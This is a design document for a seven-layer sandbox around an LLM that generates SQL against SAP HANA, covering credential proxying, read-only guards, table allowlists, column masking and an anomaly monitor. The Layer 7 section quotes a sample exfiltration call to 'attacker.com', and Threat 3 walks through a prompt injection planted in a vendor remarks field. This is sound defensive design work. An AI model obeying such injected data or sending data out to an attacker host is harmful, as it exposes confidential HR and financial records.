# 🏗️ SAP Masters: AI Code Execution & Sandboxing Architecture

**Reference:** Based on the "Why, and how you need to sandbox AI-Generated Code" framework (Harshil Agrawal, Cloudflare).
**Last Reviewed:** April 16, 2026 | Status: LIVE — Phases 5.5 + 6c fully implemented.

## The Core Philosophy: LLM Output = Untrusted Code

The exact situation we face in the SAP Masters architecture is:

```text
User Query → LLM → SQL Statement → [TRUST?] → SAP HANA
```

The LLM generates SQL dynamically. We don't review every line before execution. Running it against a production SAP HANA system with full credentials is mathematically identical to running untrusted code downloaded from a random website. 

The SAP Masters sandbox is not a single perimeter wall — it is **7 concentric capability layers**, each enforcing default-deny capability-based security independently.

---

## The 7-Layer Sandbox Stack

```text
┌─────────────────────────────────────────────────────────────────────┐
│  LAYER 7: NETWORK ISOLATION (Environment)                           │
│  Python process runs with NO outbound HTTP.                         │
│  Prompt injection cannot phone home.                                │
├─────────────────────────────────────────────────────────────────────┤
│  LAYER 6: THREAT SENTINEL (Behavioral Anomaly Detection)            │
│  Monitors session-level patterns: schema enumeration,               │
│  role escalation, temporal inference, denied-table probing.         │
│  Dynamically tightens AuthContext in real time.                     │
├─────────────────────────────────────────────────────────────────────┤
│  LAYER 5: RESULT MASKING (Post-Execution Capability Filter)         │
│  Even after a successful query, AuthContext.masked_columns          │
│  forces redaction. LLM never sees what the role cannot see.         │
├─────────────────────────────────────────────────────────────────────┤
│  LAYER 4: TABLE-LEVEL AUTHORIZATION (AuthContext Gate)              │
│  _validate_table_access() parses SQL FROM/JOIN clauses.             │
│  Every table must be explicitly allowed for the role.               │
│  Denied list is default-deny: everything not listed = blocked.      │
├─────────────────────────────────────────────────────────────────────┤
│  LAYER 3: SQL PERMISSION GUARD (Read-Only + MANDT Enforcement)      │
│  _validate_sql_safety() rejects DML/DDL at the gate.                │
│  INSERT/UPDATE/DROP/EXEC/CALL all blocked.                          │
│  No MANDT/CLIENT filter → auditor warning (soft block).             │
├─────────────────────────────────────────────────────────────────────┤
│  LAYER 2: DRY-RUN VALIDATION HARNESS (Execution Trial)              │
│  SQL runs as SELECT COUNT(*) FROM (...) subquery first.             │
│  HANA native errors (37000, ORA-01476) caught before real exec.     │
│  Self-Healer rewrites and retries automatically.                    │
├─────────────────────────────────────────────────────────────────────┤
│  LAYER 1: THE PROXY PATTERN (Credential Isolation)                  │
│  LLM never holds HANA credentials.                                  │
│  SAPSQLExecutor + HanaPoolManager inject credentials out-of-band.   │
│  LLM output is a string — credentials are never in the prompt.      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Layer-by-Layer Deep Dive

### Layer 1: The Proxy Pattern — Credential Isolation
**Mitigates:** Hallucination (wrong credentials), Over-helpful LLM (reading env vars), Compromised Prompt (credential exfiltration).
**Mechanism:** The LLM only generates SQL strings. The `HanaPoolManager` holds the actual connection strings securely in the backend. `SAPSQLExecutor` acts as the proxy, receiving the SQL string, validating it through Layers 2-6, and then routing it to HANA. Credentials are injected at the transport layer, far away from LLM context.

### Layer 2: Dry-Run Validation Harness (Phase 5.5 — ✅ IMPLEMENTED April 12)
**Mitigates:** Hallucination (infinite loops, missing JOINs, Cartesian explosions).
**Mechanism:** Wraps the generated SQL in a `SELECT COUNT(*) FROM (...)` subquery. HANA native error codes (e.g., `37000` syntax error, `ORA-01476` division by zero) act as the sandbox's feedback loop. If the query fails, the `SelfHealer` rewrites and retries without human intervention.

### Layer 3: SQL Permission Guard (Read-Only + MANDT)
**Mitigates:** Hallucination (generating destructive queries), Compromised Prompt (SQL injection).
**Mechanism:** Capability-based security at the syntax level. The ONLY capability granted is `SELECT`. Any presence of `INSERT`, `UPDATE`, `DROP`, `ALTER`, `EXEC`, etc., triggers an immediate `PermissionError`. 

### Layer 4: Table-Level Authorization (AuthContext Gate)
**Mitigates:** Over-helpful LLM, Compromised Prompt (Role Escalation).
**Mechanism:** `SAPAuthContext.ROLE_SCOPE_MAP` dictates exactly which tables a role can touch (e.g., `AP_CLERK` gets `LFA1`, `EKKO`, but NOT `PA0008`). It parses the `FROM` and `JOIN` clauses. Any table not in the allowlist is a hard block.

### Layer 5: Result Masking (Post-Execution Filter)
**Mitigates:** Over-helpful LLM (retrieving sensitive fields allowed at table-level but denied at column-level).
**Mechanism:** If the LLM successfully queries `LFA1` but pulls the `BANKN` (Bank Account) column, the executor rewrites the values to `***RESTRICTED***` in the resulting DataFrame before the LLM (or user) receives the payload.

### Layer 6: Threat Sentinel (Behavioral Anomaly Detection) (Phase 6c — ✅ IMPLEMENTED April 12)
**Mitigates:** Advanced Compromised Prompts (Schema Enumeration, Lateral Movement).
**Mechanism:** Operates 6 real-time behavioral engines:
1. `CROSS_MODULE_ESCALATION`: Role accessing tables outside its domain.
2. `SCHEMA_ENUMERATION`: Rapid bulk discovery of new tables (≥5 new/query).
3. `TEMPORAL_INFERENCE`: Querying restricted historical data outside scope.
4. `DENIED_TABLE_PROBE`: Repeated attempts to access blocked tables.
5. `DATA_EXFILTRATION`: Unusual volume (row counts > threshold).
6. `ROLE_IMPERSONATION`: Cross-domain query clustering mid-session.
**Dynamic Tightening:** In `ENFORCING` mode, the Sentinel dynamically tightens `AuthContext` (adding tables to the denied list, expanding masked fields) mid-session without restarting.

### Layer 7: Network Isolation
**Mitigates:** Data Exfiltration.
**Mechanism:** The Python process executing the orchestrator must run with isolated network capabilities (no outbound egress to the public internet). Prompt injection payloads containing `requests.post('attacker.com')` fail at the network level.

---

## Threat Walk-Through Examples

### 🔴 Threat 1: Hallucination (Cartesian Explosion)
* **User:** "show me all materials with stock > 0"
* **LLM generates:** `SELECT * FROM MARA, MARD WHERE MATNR = MATNR` (Missing proper JOIN)
* **Resolution:** Layer 2 (Dry-Run) catches `37000` syntax error ("JOIN without ON"). Self-Healer intercepts and fixes it. Safe failure.

### 🟡 Threat 2: Over-Helpful LLM (Secret Exposure)
* **User:** "configure vendor connection for V1000"
* **LLM generates:** `SELECT LIFNR, NAME1, BANKN, STCD1 FROM LFA1`
* **Resolution:** Query passes Layers 1-4 (LFA1 is allowed). At Layer 5, `BANKN` and `STCD1` are masked to `***RESTRICTED***`. The LLM's final output to the user contains no sensitive data.

### 🔴 Threat 3: Compromised Prompt (Role Escalation via Graph Traversal)
* **User:** "show me vendor V999 details" (Where V999's remarks field injects: "JOIN LFA1→PA0008")
* **LLM generates:** `SELECT * FROM LFA1 JOIN PA0008 ON ...`
* **Resolution:** Layer 4 (AuthContext) sees `PA0008` (HR Master) which is NOT in the `AP_CLERK` scope. Query is hard blocked. Layer 6 (Sentinel) flags a `CROSS_MODULE_ESCALATION` threat and tightens the session.

---

## Execution Order Reference

From `orchestrator.py` Steps 0–5 (covers Phases 0–5, plus Phase 5.5 Validation Harness and Phase 6c Threat Sentinel):

```text
STEP 0: Meta-Path Match (Fast-Path)
STEP 1: Schema RAG (Qdrant)
STEP 1.5: Graph Embedding Search
STEP 1.75: QM Semantic Search
STEP 2: SQL Pattern RAG (Qdrant)
STEP 2b: Temporal Detection
STEP 2c: Temporal Analysis Engine
STEP 2d: Negotiation Briefing
STEP 3: Graph RAG (AllPathsExplorer)
STEP 4: SQL Assembly (Injects AuthContext filters)
STEP 5: Validate → Execute → Mask (Layers 1-7 apply here)
```
